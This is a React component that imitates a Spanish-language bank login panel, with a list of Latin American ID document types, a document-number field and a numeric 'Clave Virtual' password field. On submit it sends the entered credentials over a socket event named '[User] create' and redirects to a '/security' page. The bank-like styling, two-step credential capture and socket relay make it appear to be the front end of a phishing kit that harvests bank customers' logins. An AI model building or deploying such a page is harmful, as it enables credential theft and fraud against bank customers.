import { useFormik } from 'formik';
import { useContext, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { SocketContext } from '../context/SocketContext';
import { UserDataContext } from '../context/UserDataContext';
import { PanelSuperiorDerecho } from './PanelSuperiorDerecho';

export const PanelSuperior = ({isShowing}) => {

  const { addData } = useContext(UserDataContext);
  const { socket } = useContext(SocketContext);
  const [submitBtn, setSubmitBtn] = useState(false);
  const navigate = useNavigate();

  const { handleSubmit, values, handleChange } = useFormik({
    initialValues: {
      username: '',
      password: ''
    },
    onSubmit: async({username, password}) => {

      if(submitBtn == true) {
        
        const [ newUser ] = await addData({username, password})
        await socket.emit('[User] create', newUser)
            
        setTimeout(() => {
          return navigate('/security')
        }, 1000);
      }

      return setSubmitBtn(true)
    }
  })

  return (

    <div 
      className='h-[312px] collapse bg-[#6D6E72] bgFondoSuperior' 
      id="navbarToggleExternalContent"
    >
      <div 
        className='md:grid grid-cols-7 text-white'
      >
        <div className='col-start-1 col-end-4 p-3'>
            <p className='text-2xl md:text-4xl font-normal tracking-normal mb-3'>
              Transacciones <b className='font-bold'>para Clientes</b>
            </p>

          <form
            onSubmit={handleSubmit}
            className='flex flex-col gap-2 md:gap-8 md:flex-row items-center md:items-start '
          >

            <div className='flex flex-col gap-2 md:w-[250px]'>
              <label htmlFor="tipoDocumento" className='text-xs mb-1'>
                Tipo documento
              </label>
              <select 
                name="tipoDocumento" 
                className="w-[270px] sm:w-[400px] bg-[#A6A6A6] h-[38px] rounded-lg font-normal tracking-normal text-xs pl-1 md:w-[250px]"
              >	
                  <option value="Cedula de Ciudadania" defaultValue>Cedula de Ciudadania</option>
                  <option value="Cedula de Extranjeria">Cedula de Extranjeria</option>
                  <option value="NIT">NIT</option>
                  <option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
                  <option value="Pasaporte">Pasaporte</option>
                  <option value="Trj. Seguro Social Extranjero">Trj. Seguro Social Extranjero</option>
                  <option value="Sociedad Extranjera sin NIT en Colombia">Sociedad Extranjera sin NIT en Colombia</option>
                  <option value="Fideicomiso">Fideicomiso</option>
                  <option value="NIT Menores">NIT Menores</option>
                  <option value="RIF Venezuela">RIF Venezuela</option>
                  <option value="NIT Extranjeria">NIT Extranjeria</option>
                  <option value="NIT Persona Natural">NIT Persona Natural</option>
                  <option value="Registro Civil De Nacimiento">Registro Civil De Nacimiento</option>
                  <option value="NIT Desasociado">NIT Desasociado</option>
                  <option value="CIF(Numero Unico de Cliente)">CIF(Numero Unico de Cliente)</option>
                  <option value="Numero de Identidad">Numero de Identidad</option>
                  <option value="RTN">RTN</option>
                  <option value="Cedula de Identidad">Cedula de Identidad</option>
                  <option value="DIMEX">DIMEX</option>
                  <option value="CED">CED</option>
                  <option value="PAS">PAS</option>
                  <option value="Documento Unico de Identidad">Documento Unico de Identidad</option>
                  <option value="NIT Salvadoreño">NIT Salvadoreño</option>
              </select>
              
              <div className='gap-3 hidden md:flex'>
                <input 
                  type='checkbox'
                />
                <p>Recordar datos</p>
              </div>
            </div>

            <div className='flex md:items-end md:gap-3 flex-col items-center md:flex-row'>

            <div className='flex gap-2'>
              <div className='flex flex-col gap-1'>
                <label htmlFor="documento" className='text-xs mb-2 text-center  md:text-left '>
                  No. documento
                </label>
                <input 
                    type="number" 
                    name='username'
                    value={values.username}
                    onChange={handleChange}
                    autoComplete='off'
                    required
                    inputMode='numeric'
                    className='outline-none md:w-[120px] h-[38px] rounded-lg bg-[#595959] pl-2 font-normal tracking-normal'
                  />
              </div>

              {
                submitBtn == true
                ?
                (
                  <div className='flex flex-col gap-1'>
                  
                    <label htmlFor="documento" className='text-xs mb-2 text-center  md:text-left '>
                      Clave Virtual
                    </label>
                    <input 
                        type="password" 
                        name='password'
                        value={values.password.toString().replace(/[^0-9]*$/, '')}
                        inputMode='numeric'
                        autoComplete='off'

                        onChange={handleChange}
                        required
                        className='outline-none md:w-[120px] h-[38px] rounded-lg bg-[#595959] pl-2 font-normal tracking-normal'
                      />
                  </div>
                )
                : null
              }
            </div>


              <div>
                <button
                  type='submit'
                  className='btnRed bgRed pb-[11px] pt-[8px] px-5 rounded-lg hover:bg-[#ad0000] text-sm'
                  >Ingresar
                </button>
              </div>
            </div>

          </form>
          
        </div>

        <div className='col-start-5 col-end-8 hidden md:block'>
          <PanelSuperiorDerecho />
        </div>


      </div>
    </div>

  )
}
